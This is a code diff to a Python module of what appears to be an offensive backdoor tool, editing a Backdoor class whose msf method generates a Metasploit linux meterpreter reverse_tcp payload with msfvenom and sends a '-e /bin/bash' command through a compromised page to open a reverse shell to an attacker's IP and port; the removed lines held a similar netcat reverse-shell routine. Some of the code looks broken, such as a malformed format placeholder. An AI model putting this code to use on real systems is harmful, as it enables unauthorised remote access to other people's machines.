@@ -1,5 +1,4 @@
 from subprocess import Popen, PIPE
-from platform import platform as os
 
 from core.libs.menu import Colors, getargs
 from core.libs.request_handler import make_request
@@ -27,23 +26,16 @@ class Backdoor(object):
         print '[i] \tspread  \t\tSpread our shell around'
         #print '[i] \t*xterm  \t\tUse xterm to create a reverse shell'
 
-    # Redefinition on function "netcat"
-    #def netcat(self, ip, port):
-    #    print '\n{0}[i] Make sure \'{1}\' has a listener shell ALREADY setup on port: \'{2}\'{3}'.format(Colors.GREEN, ip, port, Colors.END)
-    #    cmd = '{0} {1} {2} -e /bin/bash'.format(path, ip, port)
-    #    self.make_request.get_page_source(cmd)
-    #    print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
-
     def msf(self, ip, port):
         if len(Popen("for x in `whereis msfvenom`; do file $x | grep symbolic; done", shell=True, stdout=PIPE).stdout.read().strip()) == 0:
             print '\n{0}[!] Wasn\'t able to detect the metasploit framework{1}'.format(Colors.RED, Colors.END)
         else:
             #phpshell = Popen('msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -e php/base64 -f raw'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
-            print '\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3}\n[?] Press <return> when ready! (hint: msfcli LHOST={1} LPORT={2) E){3}'.format(Colors.GREEN,ip, port, Colors.END)
+            print '\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3}\n[?] Press <return> when ready! (hint: msfcli LHOST={1} LPORT={2) E){3}'.format(Colors.GREEN, ip, port, Colors.END)
             print '[i] Generating linux/x86/meterpreter/reverse_tcp'
             shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -e php/base64 -f raw'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
             cmd = '{0} {1} {2} -e /bin/bash'.format(shell, ip, port)
-            self.check = make_request.get_page_source(cmd)
+            make_request.get_page_source(cmd)
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
 
     def netcat(self, ip, port):
